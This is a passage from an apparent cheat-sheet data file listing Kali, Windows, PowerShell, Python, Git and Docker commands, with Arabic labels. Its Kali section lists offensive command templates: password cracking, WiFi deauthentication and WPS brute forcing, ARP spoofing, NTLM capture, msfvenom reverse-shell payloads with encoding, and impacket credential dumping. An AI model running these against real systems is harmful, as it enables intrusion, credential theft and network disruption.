hashcat -m 0 --force###تجاهل تحذير###Password###Kali
john --wordlist=list hash.txt###John###Password###Kali
john --format=NT hash.txt###NT###Password###Kali
john --format=raw-md5 hash.txt###MD5###Password###Kali
john --show hash.txt###النتائج###Password###Kali
john --incremental hash.txt###شامل###Password###Kali
john --rules --wordlist=list hash.txt###بقواعد###Password###Kali
john --format=NT --wordlist=list hash.txt###NT###Password###Kali
unshadow passwd shadow > combined###دمج###Password###Kali
crunch 8 8 abc123 -o list.txt###قاموس###Password###Kali
crunch 4 6 -t pass%% -o list.txt###قالب###Password###Kali
crunch 8 8 -f charset.lst mixalpha###مجموعة أحرف###Password###Kali
cewl -d 3 URL###كلمات موقع###Password###Kali
cewl -d 3 -m 5 URL###كلمات 5+###Password###Kali
airmon-ng start wlan0###monitor###Wireless###Kali
airmon-ng check###فحص مزعجات###Wireless###Kali
airmon-ng check kill###إيقاف مزعجات###Wireless###Kali
airmon-ng stop wlan0mon###إيقاف###Wireless###Kali
iwconfig wlan0###معلومات###Wireless###Kali
airodump-ng wlan0mon###استماع###Wireless###Kali
airodump-ng -c 6 wlan0mon###قناة###Wireless###Kali
airodump-ng --bssid MAC -c 6 -w cap wlan0mon###هدف###Wireless###Kali
airodump-ng --band a wlan0mon###5GHz###Wireless###Kali
aireplay-ng --deauth 10 -a MAC wlan0mon###deauth###Wireless###Kali
aireplay-ng --fakeauth 0 -a MAC wlan0mon###fakeauth###Wireless###Kali
aireplay-ng --arpreplay -b MAC wlan0mon###arp###Wireless###Kali
aireplay-ng --test wlan0mon###اختبار###Wireless###Kali
aircrack-ng -w list cap.cap###كسر###Wireless###Kali
aircrack-ng -w list -bssid MAC cap.cap###هدف محدد###Wireless###Kali
aircrack-ng -J out cap.cap###HCCAPX###Wireless###Kali
airbase-ng -e SSID -c 6 wlan0mon###AP وهمي###Wireless###Kali
wifite###آلي###Wireless###Kali
wifite --wpa###WPA فقط###Wireless###Kali
wifite --wps###WPS فقط###Wireless###Kali
kismet###مراقبة###Wireless###Kali
wash -i wlan0mon###WPS scan###Wireless###Kali
reaver -i wlan0mon -b MAC###WPS bruteforce###Wireless###Kali
bully -b MAC -c 6 wlan0mon###WPS بديل###Wireless###Kali
pixiewps###WPS offline###Wireless###Kali
hashcat -m 16800 hash.hccapx list###PMKID###Wireless###Kali
bettercap -iface eth0###MITM###Network###Kali
bettercap -iface wlan0###WiFi###Network###Kali
ettercap -T -M arp###ARP MITM###Network###Kali
ettercap -G###GUI###Network###Kali
responder -I eth0###NTLM###Network###Kali
responder -I eth0 -wv###verbose###Network###Kali
responder -I eth0 -A###تحليل###Network###Kali
wireshark###تحليل###Network###Kali
tshark -i eth0###طرفية###Network###Kali
tshark -i eth0 -w cap.pcap###التقاط###Network###Kali
tshark -r cap.pcap###قراءة###Network###Kali
tshark -r cap.pcap -Y 'http'###فلترة###Network###Kali
tcpdump -i eth0###التقاط###Network###Kali
tcpdump -i eth0 -w cap.pcap###حفظ###Network###Kali
tcpdump -i eth0 'port 80'###فلترة###Network###Kali
tcpdump -i eth0 -A###ASCII###Network###Kali
tcpdump -i eth0 -nn###بدون DNS###Network###Kali
mitmproxy###وسيط###Network###Kali
mitmproxy -p 8080###منفذ###Network###Kali
arpspoof -i eth0 -t target gateway###ARP spoof###Network###Kali
dnsspoof -i eth0###DNS spoof###Network###Kali
macchanger -r eth0###MAC عشوائي###Network###Kali
macchanger -m MAC eth0###MAC مخصص###Network###Kali
msfconsole###Metasploit###Exploit###Kali
msfconsole -q###صامت###Exploit###Kali
msfvenom -p linux/x64/shell###payload###Exploit###Kali
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=P###Windows###Exploit###Kali
msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=P###Android###Exploit###Kali
msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=P###PHP###Exploit###Kali
msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=P###Python###Exploit###Kali
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=P###Linux###Exploit###Kali
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=P###Shell###Exploit###Kali
msfvenom --list payloads###قائمة###Exploit###Kali
msfvenom --list encoders###مشفّرات###Exploit###Kali
msfvenom -p payload -e encoder###مع مشفّر###Exploit###Kali
msfvenom -p payload -i 5###تكرار التشفير###Exploit###Kali
msfvenom -p payload -f exe###صيغة exe###Exploit###Kali
msfvenom -p payload -f elf###صيغة elf###Exploit###Kali
msfvenom -p payload -f raw###صيغة raw###Exploit###Kali
searchsploit apache 2.4###بحث###Exploit###Kali
searchsploit -m 12345###نسخ###Exploit###Kali
searchsploit -u###تحديث###Exploit###Kali
searchsploit --cve 2021-44228###CVE###Exploit###Kali
setoolkit###SET###Social###Kali
beef-xss###XSS###Web###Kali
mimikatz###Windows###Post###Kali
bloodhound###AD###Post###Kali
shellter###حقن###Exploit###Kali
veil###payload###Exploit###Kali
crackmapexec smb target -u user -p pass###SMB###Post###Kali
crackmapexec winrm target -u user -p pass###WinRM###Post###Kali
crackmapexec smb target --shares###مشاركات###Post###Kali
crackmapexec smb target --users###مستخدمون###Post###Kali
crackmapexec smb target --pass-pol###سياسة###Post###Kali
impacket-psexec user:pass@target###PSExec###Post###Kali
impacket-secretsdump user:pass@target###Secrets###Post###Kali
impacket-wmiexec user:pass@target###WMI###Post###Kali
impacket-smbexec user:pass@target###SMB###Post###Kali
impacket-atexec user:pass@target cmd###at###Post###Kali
impacket-getTGT user:pass###TGT###Post###Kali
impacket-GetNPUsers domain/ -usersfile users###ASREP###Post###Kali
impacket-GetUserSPNs domain/user:pass -dc-ip dc###Kerberoast###Post###Kali
vol.py -f mem.dump imageinfo###Volatility###Forensics###Kali
vol.py -f mem.dump pslist###عمليات###Forensics###Kali
vol.py -f mem.dump netscan###شبكات###Forensics###Kali
vol.py -f mem.dump hashdump###هاشات###Forensics###Kali
vol.py -f mem.dump cmdline###أوامر###Forensics###Kali
vol.py -f mem.dump dlllist###DLLs###Forensics###Kali
autopsy###جنائي###Forensics###Kali
binwalk firmware.bin###firmware###Forensics###Kali
binwalk -e firmware.bin###استخراج###Forensics###Kali
foremost -i image.dd -o out###استعادة###Forensics###Kali
exiftool image.jpg###بيانات###Forensics###Kali
scalpel config.txt###استعادة###Forensics###Kali
xplico###شبكة###Forensics###Kali
bulk_extractor -o out image.dd###استخراج###Forensics###Kali
strings binary###نصوص###Reverse###Kali
gdb ./binary###debug###Reverse###Kali
gdb -q ./binary###صامت###Reverse###Kali
ltrace ./binary###مكتبات###Reverse###Kali
strace ./binary###calls###Reverse###Kali
objdump -d binary###تفكيك###Reverse###Kali
objdump -x binary###ترويسات###Reverse###Kali
readelf -h binary###ELF###Reverse###Kali
radare2 binary###RE###Reverse###Kali
r2 -A binary###تحليل تلقائي###Reverse###Kali
ghidra###GUI###Reverse###Kali
jadx -d out app.apk###APK###Reverse###Kali
jadx-gui app.apk###GUI###Reverse###Kali
apktool d app.apk###تفكيك###Reverse###Kali
apktool b folder###إعادة بناء###Reverse###Kali
proxychains command###proxy###Anon###Kali
proxychains4 command###حديث###Anon###Kali
tor###Tor###Anon###Kali
service tor start###بدء###Anon###Kali
anonsurf start###كل Tor###Anon###Kali
anonsurf stop###إيقاف###Anon###Kali
`,

    /* ==================== WINDOWS ==================== */
    windows: `
dir###عرض الملفات###ملفات###Windows
dir /a###بما فيها المخفية###ملفات###Windows
dir /s###متكرر###ملفات###Windows
dir /o:n###مرتب بالاسم###ملفات###Windows
dir /o:s###مرتب بالحجم###ملفات###Windows
cd path###تغيير مجلد###ملفات###Windows
cd..###رجوع###ملفات###Windows
cd\\###الجذر###ملفات###Windows
md folder###إنشاء مجلد###ملفات###Windows
rd folder###حذف مجلد###ملفات###Windows
del file###حذف ملف###ملفات###Windows
copy src dst###نسخ###ملفات###Windows
xcopy /s /e src dst###نسخ متكرر###ملفات###Windows
robocopy src dst /E###مزامنة###ملفات###Windows
move src dst###نقل###ملفات###Windows
ren old new###إعادة تسمية###ملفات###Windows
type file###عرض###ملفات###Windows
more file###صفحة بصفحة###ملفات###Windows
attrib +h file###إخفاء###ملفات###Windows
attrib -h file###إظهار###ملفات###Windows
attrib +r file###قراءة فقط###ملفات###Windows
tree###شجرة###ملفات###Windows
tree /f###مع ملفات###ملفات###Windows
tasklist###العمليات###عمليات###Windows
tasklist /svc###مع الخدمات###عمليات###Windows
tasklist /v###تفاصيل###عمليات###Windows
tasklist /fi "status eq running"###فلترة###عمليات###Windows
taskkill /PID 1234 /F###إيقاف###عمليات###Windows
taskkill /IM chrome.exe /F###بالاسم###عمليات###Windows
start program###تشغيل###عمليات###Windows
start "" URL###فتح رابط###عمليات###Windows
shutdown /s /t 60###إغلاق بعد دقيقة###نظام###Windows
shutdown /s /t 0###إغلاق فوري###نظام###Windows
shutdown /r###إعادة تشغيل###نظام###Windows
shutdown /l###خروج###نظام###Windows
shutdown /h###سكون###نظام###Windows
shutdown /a###إلغاء###نظام###Windows
systeminfo###معلومات###نظام###Windows
hostname###اسم###نظام###Windows
whoami###المستخدم###نظام###Windows
whoami /all###تفاصيل###نظام###Windows
whoami /priv###صلاحيات###نظام###Windows
whoami /groups###مجموعات###نظام###Windows
ver###الإصدار###نظام###Windows
set###متغيرات###نظام###Windows
set PATH###PATH###نظام###Windows
echo %PATH%###PATH###نظام###Windows
echo %USERNAME%###اسم المستخدم###نظام###Windows
date /t###التاريخ###نظام###Windows
time /t###الوقت###نظام###Windows
ipconfig###IP###شبكات###Windows
ipconfig /all###تفاصيل###شبكات###Windows
ipconfig /release###إلغاء DHCP###شبكات###Windows
ipconfig /renew###تجديد###شبكات###Windows
ipconfig /flushdns###تنظيف DNS###شبكات###Windows
ipconfig /displaydns###عرض DNS cache###شبكات###Windows
ping host###اختبار###شبكات###Windows
ping -t host###مستمر###شبكات###Windows
ping -n 4 host###4 حزم###شبكات###Windows
ping -l 1000 host###حجم###شبكات###Windows
tracert host###تتبع###شبكات###Windows
pathping host###أفضل###شبكات###Windows
nslookup domain###DNS###شبكات###Windows
nslookup domain 8.8.8.8###سيرفر محدد###شبكات###Windows
netstat -an###المنافذ###شبكات###Windows
netstat -b###مع العمليات###شبكات###Windows
netstat -r###التوجيه###شبكات###Windows
netstat -ano###PID###شبكات###Windows
net use###الاتصالات###شبكات###Windows
net use \\\\server\\share###اتصال###شبكات###Windows
net use Z: \\\\server\\share###خريطة###شبكات###Windows
net view###الأجهزة###شبكات###Windows
net view \\\\comp###مشاركات###شبكات###Windows
net share###مشاركات محلية###شبكات###Windows
net share share=C:\\path###مشاركة مجلد###شبكات###Windows
net user###المستخدمون###مستخدمون###Windows
net user user###تفاصيل###مستخدمون###Windows
net user user pass /add###إضافة###مستخدمون###Windows
net user user /delete###حذف###مستخدمون###Windows
net user user /active:no###تعطيل###مستخدمون###Windows
net user user /active:yes###تفعيل###مستخدمون###Windows
net localgroup###المجموعات###مستخدمون###Windows
net localgroup administrators###المدراء###مستخدمون###Windows
net localgroup administrators user /add###إضافة###مستخدمون###Windows
net localgroup administrators user /delete###إزالة###مستخدمون###Windows
net start###الخدمات###خدمات###Windows
net stop service###إيقاف###خدمات###Windows
net start service###تشغيل###خدمات###Windows
net pause service###إيقاف مؤقت###خدمات###Windows
net continue service###استئناف###خدمات###Windows
sc query###استعلام###خدمات###Windows
sc query service###تفاصيل###خدمات###Windows
sc config###تكوين###خدمات###Windows
sc start service###تشغيل###خدمات###Windows
sc stop service###إيقاف###خدمات###Windows
sc create name###إنشاء###خدمات###Windows
sc delete name###حذف###خدمات###Windows
wmic process list brief###العمليات###إدارة###Windows
wmic process where name='x' delete###إيقاف###إدارة###Windows
wmic process get name,processid###PID###إدارة###Windows
wmic startup list###بدء###إدارة###Windows
wmic product get name###برامج###إدارة###Windows
wmic useraccount list###حسابات###إدارة###Windows
wmic logicaldisk get name,size,freespace###أقراص###إدارة###Windows
wmic bios get serialnumber###تسلسلي###إدارة###Windows
wmic csproduct get name###طراز###إدارة###Windows
wmic os get caption###OS###إدارة###Windows
wmic memorychip get capacity###ذاكرة###إدارة###Windows
reg query HKLM###سجل###سجل###Windows
reg query HKCU###سجل مستخدم###سجل###Windows
reg add key###إضافة###سجل###Windows
reg delete key###حذف###سجل###Windows
reg export key file.reg###تصدير###سجل###Windows
reg import file.reg###استيراد###سجل###Windows
regedit###محرر###سجل###Windows
chkdsk###فحص قرص###صيانة###Windows
chkdsk C: /f###إصلاح###صيانة###Windows
sfc /scannow###فحص نظام###صيانة###Windows
dism /online /cleanup-image /restorehealth###إصلاح###صيانة###Windows
diskpart###مدير أقراص###صيانة###Windows
cleanmgr###تنظيف###صيانة###Windows
msconfig###إعدادات###إعدادات###Windows
devmgmt.msc###الأجهزة###إعدادات###Windows
services.msc###الخدمات###إعدادات###Windows
compmgmt.msc###إدارة###إعدادات###Windows
gpedit.msc###Group Policy###إعدادات###Windows
control###لوحة التحكم###إعدادات###Windows
firewall.cpl###الجدار###إعدادات###Windows
appwiz.cpl###البرامج###إعدادات###Windows
ncpa.cpl###الشبكات###إعدادات###Windows
eventvwr###عارض الأحداث###إعدادات###Windows
netsh advfirewall firewall show rule name=all###قواعد###جدارناري###Windows
netsh advfirewall firewall add rule name='A80' dir=in action=allow protocol=TCP localport=80###إضافة###جدارناري###Windows
netsh advfirewall set allprofiles state on###تفعيل###جدارناري###Windows
netsh wlan show profiles###WiFi###WiFi###Windows
netsh wlan show profile name='S' key=clear###كلمة مرور###WiFi###Windows
netsh wlan show interfaces###واجهات###WiFi###Windows
netsh interface ip set address###تعيين IP###شبكات###Windows
netsh int ip reset###إعادة IP###شبكات###Windows
netsh winsock reset###إعادة Winsock###شبكات###Windows
runas /user:admin cmd###مستخدم آخر###مستخدمون###Windows
cipher /w:c:###محو آمن###أمن###Windows
takeown /f file###ملكية###صلاحيات###Windows
icacls file /grant user:F###صلاحيات###صلاحيات###Windows
icacls file /remove user###إزالة###صلاحيات###Windows
cacls file /g user:F###صلاحيات###صلاحيات###Windows
gpupdate /force###تحديث GP###إدارة###Windows
gpresult /r###نتائج GP###إدارة###Windows
`,

    /* ==================== POWERSHELL ==================== */
    powershell: `
Get-Help###المساعدة###أساسيات###PowerShell
Get-Help cmdlet###مساعد###أساسيات###PowerShell
Get-Command###الأوامر###أساسيات###PowerShell
Get-Command -Verb Get###فلترة###أساسيات###PowerShell
Get-Alias###الأسماء البديلة###أساسيات###PowerShell
Get-Process###العمليات###عمليات###PowerShell
Get-Process -Name chrome###بالاسم###عمليات###PowerShell
Stop-Process -Name chrome###إيقاف###عمليات###PowerShell
Stop-Process -Id 1234 -Force###PID###عمليات###PowerShell
Start-Process notepad###تشغيل###عمليات###PowerShell
Wait-Process###انتظار###عمليات###PowerShell
Get-Service###الخدمات###خدمات###PowerShell
Get-Service -Name spooler###حالة###خدمات###PowerShell
Start-Service name###تشغيل###خدمات###PowerShell
Stop-Service name###إيقاف###خدمات###PowerShell
Restart-Service name###إعادة###خدمات###PowerShell
Set-Service -StartupType Automatic###تلقائي###خدمات###PowerShell
Get-ChildItem###الملفات###ملفات###PowerShell
Get-ChildItem -Recurse###متكرر###ملفات###PowerShell
Get-ChildItem -Filter '*.log'###فلترة###ملفات###PowerShell
Get-ChildItem -Hidden###مخفية###ملفات###PowerShell
Set-Location path###مجلد###ملفات###PowerShell
New-Item -ItemType File###ملف###ملفات###PowerShell
New-Item -ItemType Directory###مجلد###ملفات###PowerShell
Remove-Item file###حذف###ملفات###PowerShell
Remove-Item -Recurse###متكرر###ملفات###PowerShell
Copy-Item src dst###نسخ###ملفات###PowerShell
Copy-Item -Recurse###متكرر###ملفات###PowerShell
Move-Item src dst###نقل###ملفات###PowerShell
Rename-Item old new###تسمية###ملفات###PowerShell
Get-Content file###قراءة###ملفات###PowerShell
Set-Content file text###كتابة###ملفات###PowerShell
Add-Content file text###إضافة###ملفات###PowerShell
Out-File file###حفظ###ملفات###PowerShell
Select-String -Path file -Pattern 'x'###بحث###نصوص###PowerShell
Get-ComputerInfo###معلومات###نظام###PowerShell
Get-Host###host###نظام###PowerShell
Get-Date###التاريخ###نظام###PowerShell
Get-Uptime###مدة التشغيل###نظام###PowerShell
Get-PSDrive###الأقراص###نظام###PowerShell
Get-Hotfix###تحديثات###نظام###PowerShell
Get-EventLog -LogName System###سجلات###سجلات###PowerShell
Get-EventLog -LogName System -Newest 50###آخر 50###سجلات###PowerShell
Get-WinEvent###أحداث###سجلات###PowerShell
Get-LocalUser###مستخدمون###مستخدمون###PowerShell
Get-LocalUser -Name user###تفاصيل###مستخدمون###PowerShell
New-LocalUser -Name new###جديد###مستخدمون###PowerShell
Remove-LocalUser###حذف###مستخدمون###PowerShell
Get-LocalGroup###المجموعات###مستخدمون###PowerShell
Add-LocalGroupMember###إضافة###مستخدمون###PowerShell
Remove-LocalGroupMember###إزالة###مستخدمون###PowerShell
Get-NetIPAddress###IP###شبكات###PowerShell
Get-NetAdapter###المحولات###شبكات###PowerShell
Get-NetRoute###التوجيه###شبكات###PowerShell
Test-Connection host###ping###شبكات###PowerShell
Test-NetConnection host###فحص###شبكات###PowerShell
Test-NetConnection host -Port 80###منفذ###شبكات###PowerShell
Resolve-DnsName domain###DNS###شبكات###PowerShell
Get-NetTCPConnection###اتصالات###شبكات###PowerShell
Get-NetFirewallRule###قواعد###جدارناري###PowerShell
New-NetFirewallRule -DisplayName 'A80' -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow###قاعدة###جدارناري###PowerShell
Remove-NetFirewallRule###حذف###جدارناري###PowerShell
Invoke-WebRequest URL###HTTP###شبكات###PowerShell
Invoke-WebRequest -OutFile file URL###حفظ###شبكات###PowerShell
Invoke-RestMethod URL###REST###شبكات###PowerShell
Invoke-Expression###تنفيذ###أوامر###PowerShell
Get-ExecutionPolicy###سياسة###أمن###PowerShell
Set-ExecutionPolicy RemoteSigned###تغيير###أمن###PowerShell
Set-ExecutionPolicy Unrestricted###فتح###أمن###PowerShell
Get-ChildItem -Recurse -Filter '*.log'###بحث###ملفات###PowerShell
Export-Csv###تصدير###بيانات###PowerShell
Import-Csv###قراءة###بيانات###PowerShell
ConvertTo-Json###JSON###بيانات###PowerShell
ConvertFrom-Json###من JSON###بيانات###PowerShell
ConvertTo-Html###HTML###بيانات###PowerShell
Select-Object -First 10###أول 10###بيانات###PowerShell
Select-Object -Last 10###آخر 10###بيانات###PowerShell
Where-Object { $_.Name -eq 'x' }###فلترة###بيانات###PowerShell
Sort-Object###ترتيب###بيانات###PowerShell
Group-Object###تجميع###بيانات###PowerShell
Measure-Object###قياس###بيانات###PowerShell
ForEach-Object###لكل عنصر###بيانات###PowerShell
Get-Acl file###صلاحيات###صلاحيات###PowerShell
Set-Acl file acl###تعيين###صلاحيات###PowerShell
Get-CimInstance Win32_Product###برامج###إدارة###PowerShell
Get-CimInstance Win32_BIOS###BIOS###إدارة###PowerShell
Get-CimInstance Win32_OperatingSystem###OS###إدارة###PowerShell
Get-Volume###أحجام###إدارة###PowerShell
Get-Disk###أقراص###إدارة###PowerShell
Get-Partition###أقسام###إدارة###PowerShell
`,

    /* ==================== PYTHON ==================== */
    python: `
python script.py###تشغيل###تشغيل###Python
python3 script.py###Python3###تشغيل###Python
python -i###تفاعلي###تشغيل###Python
python -c 'code'###سطر واحد###تشغيل###Python
python -m http.server 8000###خادم HTTP###ويب###Python
python -m venv env###بيئة###بيئة###Python
source env/bin/activate###تفعيل Linux###بيئة###Python
env\\Scripts\\activate###تفعيل Windows###بيئة###Python
deactivate###إلغاء تفعيل###بيئة###Python
pip install pkg###تثبيت###حزم###Python
pip install pkg==1.0###إصدار###حزم###Python
pip uninstall pkg###إزالة###حزم###Python
pip list###المثبتة###حزم###Python
pip freeze###قائمة كاملة###حزم###Python
pip freeze > req.txt###تصدير###حزم###Python
pip install -r req.txt###تثبيت###حزم###Python
pip install --upgrade pip###ترقية###حزم###Python
pip show pkg###تفاصيل###حزم###Python
import requests###HTTP###مكتبات###Python
import socket###الشبكة###مكتبات###Python
import os###نظام###مكتبات###Python
import sys###نظام###مكتبات###Python
import subprocess###تنفيذ###مكتبات###Python
import hashlib###هاش###مكتبات###Python
import base64###base64###مكتبات###Python
import json###JSON###مكتبات###Python
import re###regex###مكتبات###Python
import time###وقت###مكتبات###Python
import random###عشوائي###مكتبات###Python
import threading###خيوط###مكتبات###Python
import multiprocessing###تعدد###مكتبات###Python
from scapy.all import *###Scapy###مكتبات###Python
import paramiko###SSH###مكتبات###Python
import cryptography###تشفير###مكتبات###Python
from bs4 import BeautifulSoup###BS4###مكتبات###Python
import urllib.request###URL###مكتبات###Python
import argparse###وسائط###مكتبات###Python
socket.gethostbyname('host')###IP###شبكات###Python
socket.gethostbyaddr('IP')###عكس###شبكات###Python
socket.create_connection(('host',80))###اتصال###شبكات###Python
s = socket.socket()###socket###شبكات###Python
s.bind(('0.0.0.0',4444))###ربط###شبكات###Python
s.listen(5)###استماع###شبكات###Python
s.accept()###قبول###شبكات###Python
s.connect(('host',80))###اتصال###شبكات###Python
s.send(b'data')###إرسال###شبكات###Python
s.recv(1024)###استقبال###شبكات###Python
s.close()###إغلاق###شبكات###Python
requests.get('URL')###GET###ويب###Python
requests.post('URL',data={})###POST###ويب###Python
requests.put('URL',data={})###PUT###ويب###Python
requests.delete('URL')###DELETE###ويب###Python
requests.Session()###جلسة###ويب###Python
requests.get('URL',headers={})###ترويسات###ويب###Python
requests.get('URL',params={})###معاملات###ويب###Python
requests.get('URL',proxies={})###proxy###ويب###Python
BeautifulSoup(html,'html.parser')###تحليل HTML###ويب###Python
soup.find_all('a')###كل الروابط###ويب###Python
soup.find('div',class_='x')###بحث###ويب###Python
hashlib.md5(b'text').hexdigest()###MD5###تشفير###Python
hashlib.sha256(b'text').hexdigest()###SHA-256###تشفير###Python
hashlib.sha512(b'text').hexdigest()###SHA-512###تشفير###Python
base64.b64encode(b'text')###base64###تشفير###Python
base64.b64decode(data)###فك base64###تشفير###Python
os.system('cmd')###تنفيذ###نظام###Python
subprocess.run(['ls','-la'])##تنفيذ آمن###نظام###Python
subprocess.Popen(['cmd'])##خلفية###نظام###Python
os.listdir('.')###قائمة###ملفات###Python
os.getcwd()###المسار###ملفات###Python
os.chdir('/path')###تغيير###ملفات###Python
os.makedirs('a/b/c')###إنشاء متداخل###ملفات###Python
os.remove('file')###حذف###ملفات###Python
os.rename('old','new')###إعادة تسمية###ملفات###Python
open('file','r').read()###قراءة###ملفات###Python
open('file','w').write('text')###كتابة###ملفات###Python
with open('file','a') as f: f.write('x')###إضافة###ملفات###Python
json.loads(str)###قراءة JSON###بيانات###Python
json.dumps(obj)###إلى JSON###بيانات###Python
json.load(open('file'))###من ملف###بيانات###Python
json.dump(obj,open('file','w'))###إلى ملف###بيانات###Python
random.choice([1,2,3])###عشوائي###أدوات###Python
random.randint(1,100)###عشوائي###أدوات###Python
random.shuffle(list)###خلط###أدوات###Python
time.sleep(5)###انتظار###أدوات###Python
time.time()###توقيت###أدوات###Python
datetime.now()###تاريخ###أدوات###Python
re.findall(pattern,text)###regex###نصوص###Python
re.search(pattern,text)###بحث###نصوص###Python
re.sub(pattern,repl,text)###استبدال###نصوص###Python
sys.argv[1:]##وسائط###نصوص###Python
len(string)###طول###نصوص###Python
string.split(',')###تقسيم###نصوص###Python
','.join(list)###دمج###نصوص###Python
string.strip()###إزالة فراغات###نصوص###Python
string.upper()###أحرف كبيرة###نصوص###Python
string.lower()###أحرف صغيرة###نصوص###Python
string.replace('a','b')###استبدال###نصوص###Python
`,

    /* ==================== GIT ==================== */
    git: `
git init###تهيئة###أساسيات###Git
git clone URL###استنساخ###أساسيات###Git
git clone URL folder###باسم مخصص###أساسيات###Git
git clone --depth 1 URL###سطحية###أساسيات###Git
git status###الحالة###أساسيات###Git
git add file###إضافة###أساسيات###Git
git add .###الكل###أساسيات###Git
git add -A###الكل###أساسيات###Git
git add -p###جزئي###أساسيات###Git
git commit -m 'msg'###التزام###أساسيات###Git
git commit -am 'msg'###إضافة+التزام###أساسيات###Git
git commit --amend###تعديل###أساسيات###Git
git log###السجل###معلومات###Git
git log --oneline###مختصر###معلومات###Git
git log --graph###شجرة###معلومات###Git
git log -p###تفاصيل###معلومات###Git
git log --author='name'###بمؤلف###معلومات###Git
git log --since='1 week ago'###بتاريخ###معلومات###Git
git log --oneline -10###آخر 10###معلومات###Git
git show commit###عرض###معلومات###Git
git show HEAD###آخر###معلومات###Git
git diff###الفروقات###معلومات###Git
git diff --staged###المضافة###معلومات###Git
git diff HEAD~1###مع سابق###معلومات###Git
git branch###الفروع###فروع###Git
git branch -a###كل الفروع###فروع###Git
git branch new###جديد###فروع###Git
git branch -d branch###حذف###فروع###Git
git branch -D branch###حذف قسري###فروع###Git
git branch -m old new###إعادة تسمية###فروع###Git
git checkout branch###تبديل###فروع###Git
git checkout -b branch###إنشاء+تبديل###فروع###Git
git checkout commit###لـ commit###فروع###Git
git merge branch###دمج###فروع###Git
git merge --no-ff branch###بدون fast-forward###فروع###Git
git merge --abort###إلغاء###فروع###Git
git rebase branch###إعادة قاعدة###فروع###Git
git rebase -i HEAD~3###تفاعلي###فروع###Git
git cherry-pick commit###انتقاء###فروع###Git
git push###دفع###Remote###Git
git push origin branch###لفرع###Remote###Git
git push -u origin branch###تتبع###Remote###Git
git push --force###قسري###Remote###Git
git push --tags###الوسوم###Remote###Git
git push --delete origin branch###حذف###Remote###Git
git pull###سحب###Remote###Git
git pull --rebase###مع rebase###Remote###Git
git fetch###جلب###Remote###Git
git fetch --all###كل###Remote###Git
git fetch --prune###تنظيف###Remote###Git
git remote -v###Remote URLs###Remote###Git
git remote add origin URL###إضافة###Remote###Git
git remote set-url origin URL###تغيير###Remote###Git
git remote remove origin###حذف###Remote###Git
git reset HEAD file###إلغاء إضافة###إصلاح###Git
git reset --soft HEAD~1###إلغاء التزام###إصلاح###Git
git reset --mixed HEAD~1###متوسط###إصلاح###Git
git reset --hard HEAD###إعادة تعيين###إصلاح###Git
git reset --hard origin/main###مزامنة مع remote###إصلاح###Git
git checkout -- file###استعادة###إصلاح###Git
git restore file###حديث###إصلاح###Git
git restore --staged file###إلغاء إضافة###إصلاح###Git
git revert commit###عكس###إصلاح###Git
git revert HEAD###عكس آخر###إصلاح###Git
git stash###حفظ مؤقت###حفظ###Git
git stash save 'msg'###برسالة###حفظ###Git
git stash pop###استعادة###حفظ###Git
git stash list###القائمة###حفظ###Git
git stash apply###تطبيق###حفظ###Git
git stash drop###حذف###حفظ###Git
git stash clear###تفريغ###حفظ###Git
git tag v1.0###وسم###إصدارات###Git
git tag -a v1.0 -m 'msg'###مع رسالة###إصدارات###Git
git tag###كل الوسوم###إصدارات###Git
git tag -d v1.0###حذف###إصدارات###Git
git push origin v1.0###دفع وسم###إصدارات###Git
git config --global user.name 'n'###اسم###إعداد###Git
git config --global user.email 'e@x'###إيميل###إعداد###Git
git config --global core.editor vim###محرر###إعداد###Git
git config --list###الإعدادات###إعداد###Git
git config --global alias.co checkout###اختصار###إعداد###Git
git clean -fd###تنظيف###تنظيف###Git
git clean -n###تجريبي###تنظيف###Git
git gc###ضغط###تنظيف###Git
git fsck###فحص###تنظيف###Git
git blame file###من كتب###معلومات###Git
git shortlog -sne###إحصائيات###معلومات###Git
git archive --format=zip HEAD > file.zip###أرشيف###إصدارات###Git
`,

    /* ==================== DOCKER ==================== */
    docker: `
docker --version###الإصدار###أساسيات###Docker
docker info###معلومات###أساسيات###Docker
docker ps###الحاويات###حاويات###Docker
docker ps -a###الكل###حاويات###Docker
docker ps -q###معرفات فقط###حاويات###Docker
docker images###الصور###صور###Docker
docker images -a###كل الصور###صور###Docker
docker pull image###سحب###صور###Docker
docker pull image:tag###إصدار###صور###Docker
docker push image###دفع###Registry###Docker
docker run image###تشغيل###حاويات###Docker
docker run -d image###خلفية###حاويات###Docker
docker run -it image bash###تفاعلي###حاويات###Docker
docker run -p 8080:80 image###منافذ###حاويات###Docker
docker run -p 8080:80 -d image###مع خلفية###حاويات###Docker
docker run -v /local:/cont image###أحجام###حاويات###Docker
docker run --name mycont image###اسم###حاويات###Docker
docker run --rm image###حذف بعد الخروج###حاويات###Docker
docker run -e VAR=value image###متغير###حاويات###Docker
docker run --network net image###شبكة###حاويات###Docker
docker exec -it cont bash###دخول###حاويات###Docker
docker exec -it cont sh###sh###حاويات###Docker
docker exec cont cmd###أمر###حاويات###Docker
docker stop cont###إيقاف###حاويات###Docker
docker stop $(docker ps -q)###إيقاف الكل###حاويات###Docker
docker start cont###تشغيل###حاويات###Docker
docker restart cont###إعادة###حاويات###Docker
docker kill cont###إيقاف قسري###حاويات###Docker
docker rm cont###حذف###حاويات###Docker
docker rm $(docker ps -aq)###حذف الكل###حاويات###Docker
docker rmi image###حذف صورة###صور###Docker
docker rmi $(docker images -q)###حذف كل الصور###صور###Docker
docker logs cont###سجلات###حاويات###Docker
docker logs -f cont###متابعة###حاويات###Docker
docker logs --tail 50 cont###آخر 50###حاويات###Docker
docker inspect cont###تفاصيل###حاويات###Docker
docker inspect -f '{{.State.Pid}}' cont###PID###حاويات###Docker
docker stats###إحصائيات###مراقبة###Docker
docker stats --no-stream###مرة واحدة###مراقبة###Docker
docker top cont###عمليات###مراقبة###Docker
docker cp src cont:/path###نسخ للحاوية###حاويات###Docker
docker cp cont:/path dst###من الحاوية###حاويات###Docker
docker port cont###منافذ###حاويات###Docker
docker diff cont###التغييرات###حاويات###Docker
docker build -t name .###بناء###بناء###Docker
docker build -t name:tag .###بإصدار###بناء###Docker
docker build -f Dockerfile.prod###ملف محدد###بناء###Docker
docker build --no-cache .###بدون كاش###بناء###Docker
